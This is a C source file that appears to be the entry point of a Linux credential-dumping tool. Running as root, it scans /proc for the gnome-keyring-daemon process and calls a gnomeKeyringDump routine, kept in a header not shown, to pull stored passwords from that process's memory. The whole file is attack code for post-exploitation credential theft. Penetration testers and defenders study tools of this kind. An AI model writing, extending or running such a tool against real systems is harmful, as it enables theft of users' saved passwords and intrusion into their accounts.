#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>

#include "targets.h"
#include "gnomeKeyring.h"
#include "util.h"

int processTarget(char *target)
{
    DIR *dir = NULL;
    struct dirent* de = 0;
    int pid = -1, ret = -1;
    int result = 0;
    FILE *fp = NULL;
    char cmdlineFile[MAX_PATH] = {0};
    char *taskName = NULL;
    size_t taskSize = 0;

    dir = opendir(PROC);
    if ( dir == NULL )
    {
        printf("[!] ERROR: Failed to open /proc\n");
        return -1;
    }

    while ((de = readdir(dir)) != 0 )
    {
        if ( !strcmp(de->d_name, ".") || !strcmp(de->d_name, ".."))
            continue;

        result = 0;
        result = sscanf(de->d_name, "%d", &pid);

        if ( result != 1)
            continue;
        memset(cmdlineFile, 0, MAX_PATH);
        snprintf(cmdlineFile, MAX_PATH-1, "%s/%d/cmdline", PROC, pid);

        if ( (fp = fopen(cmdlineFile, "r")) == NULL )
            continue; // likley lost the race for a process that just closed

        taskSize = 0;
        if ( getline(&taskName, &taskSize, fp) > 0 )
        {
            if ( strstr(taskName, GNOME_KEYRING_DAEMON) ) // gnome-keyring-daemon process
            {
                if ( gnomeKeyringDump(pid) < 0 )
                {
                    printf("  [!] ERROR: dumping passwords from keyring\n");
                    //goto CLEANUP;
                }
            }
        }
        if (taskName != NULL)
        {
            free(taskName);
            taskName = NULL;
        }

        if ( fp != NULL )
        {
            fclose(fp);
            fp = NULL;
        }
    }

    ret = 0;
    CLEANUP:
         if (taskName != NULL)
        {
            free(taskName);
            taskName = NULL;
        }

        if ( fp != NULL )
        {
            fclose(fp);
            fp = NULL;
        }
        return ret;
}

int main()
{
    size_t numTargets = sizeof(g_targets)/sizeof(char*);

    if ( getuid() != 0 )
    {
        printf("[!] Must be root!\n");
        return -1;
    }

    for (int i=0; i <numTargets; i++)
    {
        processTarget(g_targets[i]);
    }
    return 0;
}
